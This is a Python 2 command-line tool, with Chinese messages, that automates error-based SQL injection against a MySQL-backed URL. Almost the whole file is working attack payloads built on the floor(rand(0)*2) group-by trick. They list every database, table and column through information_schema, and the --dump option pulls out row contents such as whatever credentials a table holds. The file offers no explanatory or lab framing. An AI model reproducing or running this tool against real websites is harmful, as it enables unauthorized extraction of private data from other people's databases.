#!/usr/bin/env python
#coding=utf-8

import sys
import requests
import re
import binascii
#sys.argv[1]
# --dbs url
# --tables -D database url
# --columns -T tablename -D database url
# --dump -C columnname -T tablename -D database url

def http_get(url):
    # proxies = {'http': 'http://127.0.0.1:8080'}
    #return requests.get(dbs_num_url, proxies=proxies)
    return requests.get(url)

def getAllDatabases(url):
    dbs_num_url = url + "'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e7e3a7e7e, count(distinct+table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ "
    resp = http_get(dbs_num_url)
    html = resp.content
    #print html
    # ~~:~~4~~:~~
    dbs_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
    print (u"数据库数量: %d" % dbs_num)
    dbs = []
    print (u"数据库名: ")
    for index in xrange(0,dbs_num):
        db_name_url = url + "'+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+" % index
        html = http_get(db_name_url).content
        db_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
        dbs.append(db_name)
        print ("\t%s" % db_name)
def getAllTablesByDb(url, db_name):
    db_name_hex = "0x" + binascii.b2a_hex(db_name)
    tables_num_url = url + "'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e, count(table_name), 0x7e7e3a7e7e)  from information_schema.tables where table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+" % db_name_hex
    html = http_get(tables_num_url).content
    tables_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
    print (u"%s 库中，表的数量: %d" % (db_name, tables_num))
    print (u"表名: ")
    for index in xrange(0,tables_num):
        tables_name_url = url + "'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e, table_name, 0x7e7e3a7e7e) from information_schema.tables where table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+" % (db_name_hex, index)
        html = http_get(tables_name_url).content
        table_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
        print ("\t%s" % table_name)

def getAllColumnsByTable(url, db_name,tab_name):
    db_name_hex = "0x" + binascii.b2a_hex(db_name)
    tab_name_hex = "0x" + binascii.b2a_hex(tab_name)
    column_num_url = url + "' and (select 1 from (select count(*),concat(0x3a,0x3a,(select count(column_name) from information_schema.columns where table_schema=%s and table_name=%s),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) --+" % (db_name_hex,tab_name_hex)
    html = http_get(column_num_url).content
    column_num = int(re.search(r'::(\d*?)::', html).group(1))
    print (u"%s 表中，字段的数量: %d" % (tab_name, column_num))
    print (u"列名：")
    for index in xrange(0,column_num):
        tables_name_url = url + "' and (select 1  from (select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_schema=%s and table_name=%s limit %d,1),0x3a,0x3a, floor(rand(0)*2)) a from information_schema.columns group by a)s) --+" % (db_name_hex,tab_name_hex,index)
        html = http_get(tables_name_url).content
        column_name = re.search(r'::(.*?)::', html).group(1)
        print ("\t%s" % column_name)
    pass

def getAllContent(url, db_name, tab_name, col_name,):
    # db_name_hex = "0x" + binascii.b2a_hex(db_name)
    # tab_name_hex = "0x" + binascii.b2a_hex(tab_name)
    # col_name = binascii.b2a_hex(col_name)
    # col = re.split(",",col_name) #分割参数:字段名
    # le = len(col)
    content_num_url = url + "' and (select 1 from (select count(*),concat(0x3a,0x3a,(select count(*) from %s.%s),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a)s) --+" % (db_name,tab_name)
    html = http_get(content_num_url).content
    col_name_re = col_name.replace(',',',0x09,')
    content_num = int(re.search(r'::(\d*?)::', html).group(1))
    print "%s 表中，行数为: %d" % (tab_name, content_num)
    for index in xrange(0,content_num):
            content_name_url = url + "' and (select 1  from (select count(*),concat((select concat(0x3a,0x3a,%s,0x3a,0x3a) from %s.%s limit %d,1), floor(rand(0)*2)) a from information_schema.columns group by a)s) --+" % (col_name_re,db_name,tab_name,index)
            html = http_get(content_name_url).content
            # print htmlsss
            content_name = re.search(r'::(.*?)::', html).group(1)
            print "\t%s" % content_name


def main():
    if sys.argv[1] == '--dbs':
        getAllDatabases(sys.argv[2])
    elif sys.argv[1] == '--tables':
        getAllTablesByDb(sys.argv[4], sys.argv[3])
    elif sys.argv[1] == '--columns':
        # print sys.argv[6],sys.argv[5],sys.argv[3]
        getAllColumnsByTable(sys.argv[6],sys.argv[5],sys.argv[3])
        pass
    elif sys.argv[1] == '--dump':
        getAllContent(sys.argv[8], sys.argv[7], sys.argv[5], sys.argv[3])
        # print sys.argv[8], sys.argv[7], sys.argv[5], sys.argv[3]
        pass
    else:
        print (u"我不懂你的参数!")

if __name__ == '__main__':
    main()